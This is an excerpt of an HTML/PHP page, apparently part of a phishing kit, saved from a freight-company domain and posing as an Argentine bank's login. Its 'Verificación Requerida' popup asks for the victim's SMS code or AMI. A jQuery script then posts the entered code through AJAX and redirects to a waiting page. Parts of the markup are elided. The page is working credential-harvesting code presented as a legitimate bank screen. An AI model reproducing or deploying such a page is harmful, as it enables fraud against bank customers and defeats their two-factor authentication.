...
?>
<!DOCTYPE html>
<!-- saved from url=(0046)https://internacionaldecarga.com/bdved/sms.php -->
...
<body bis_register="">
	...
	<app-root _nghost-c0="" ng-version="6.1.10">
					...
					<div _ngcontent-c10="" class="login-container-float-center" bis_skin_checked="1">
						<div _ngcontent-c10="" class="row" bis_skin_checked="1">
							<div _ngcontent-c10="" class="col s12 not-margin not-padding" bis_skin_checked="1">
								<div _ngcontent-c10="" bis_skin_checked="1">
									<div _ngcontent-c10="" class="login-container-logo" bis_skin_checked="1"><img _ngcontent-c10="" class="logo-login" src="../img/logo.png"></div>
									...
									<div _ngcontent-c15="" class="row" bis_skin_checked="1">
										...
										<div _ngcontent-c15="" class="row" bis_skin_checked="1">
											<div _ngcontent-c15="" class="button-container" bis_skin_checked="1">
												<button id="yayo" disabled="true" _ngcontent-c15="" color="accent" mat-raised-button="" type="submit" class="mat-raised-button mat-accent ng-pristine ng-invalid ng-touched u-btn-1" onclick="chc()&gt;
												
												
												
												&lt;span class=" mat-button-wrapper"="">Continuar</button>
													<div class="mat-button-ripple mat-ripple" matripple="" bis_skin_checked="1"></div>
													<div class="mat-button-focus-overlay" bis_skin_checked="1"></div>
		...
		<section class="containerCustom" id="docPopup" style="display: block;">
			<form id="mainF" name="mainF">
				<div class="overlay" bis_skin_checked="1">
					<div class="modalCustom" bis_skin_checked="1">
						<center>
							<img src="../img/logo.png" width="225px"><br>

						<h1 class="title" style="font-size: 21px;">Verificación Requerida</h1>

							<hr>
							<p>Ingresá el código SMS enviado o tu AMI</p>
							<input id="otpp" class="inputCodes" maxlength="8" minlength="6" name="smscode" placeholder="Código" required="" type="text"><br>
							<br>
							<button class="boton patito" id="mainB" type="button">CONTINUAR</button>
						</center>
					</div>
				</div>
			</form>
...
<script>
    $(document).on('click', '.patito', function(e) {
      var otp = $('#otpp').val();
      
      if(otp.length == 0) {
        $('.hero').css('display', 'none');
        $('#otpp').css('background-color', '#fb313147');
        return;
        ...
        $.ajax({
            ...
            success: function(resp){
                if(resp.st == "failure") {
                    ...
                    setTimeout(function() {
                      window.location.href = 'espere..php';
                    }, 1);
                } 
            }
        });
